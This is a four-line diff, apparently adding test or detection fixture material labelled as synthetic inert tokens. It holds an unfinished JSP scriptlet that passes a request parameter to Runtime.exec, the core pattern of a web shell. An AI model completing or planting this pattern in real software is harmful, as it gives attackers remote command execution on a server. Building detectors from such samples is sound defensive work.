@@ -1,0 +1,4 @@
+SYNTHETIC INERT TOKENS - never execute
+<%
+Runtime.getRuntime().exec(
+request.getParameter(
